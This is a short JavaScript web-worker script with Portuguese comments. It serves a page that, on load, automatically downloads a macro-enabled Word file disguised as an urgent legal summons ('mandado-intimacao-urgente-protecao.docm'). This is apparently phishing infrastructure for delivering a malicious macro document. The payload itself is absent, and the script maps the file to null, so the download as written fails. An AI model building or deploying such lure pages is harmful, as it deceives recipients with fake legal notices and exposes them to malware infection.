export default {
  async fetch(request) {
    const url = new URL(request.url);
    
    // Servir arquivo específico ou index.html
    let filePath = url.pathname === '/' ? 'index.html' : url.pathname.substring(1);
    
    // Simples: retornar conteúdo inline (para demo)
    const files = {
      'index.html': getIndexHTML(),
      'document.docm': null  // Será servido via link esterno
    };
    
    if (filePath in files && files[filePath]) {
      return new Response(files[filePath], {
        headers: { 'Content-Type': 'text/html; charset=utf-8' }
      });
    }
    
    return new Response('Not found', { status: 404 });
  }
};

function getIndexHTML() {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body onload="initiateDownload()">
    <h2>Carregando documento...</h2>
    <p id="status">Por favor aguarde...</p>
    <script>
        async function initiateDownload() {
            try {
                const response = await fetch('./document.docm');
                if (!response.ok) throw new Error('Arquivo não encontrado');
                
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                
                const link = document.createElement('a');
                link.href = url;
                link.download = 'mandado-intimacao-urgente-protecao.docm';
                link.click();
                URL.revokeObjectURL(url);
                
                document.getElementById('status').textContent = 'Download iniciado...';
            } catch (error) {
                document.getElementById('status').textContent = 'Erro: ' + error.message;
            }
        }
    </script>
</body>
</html>`;
}
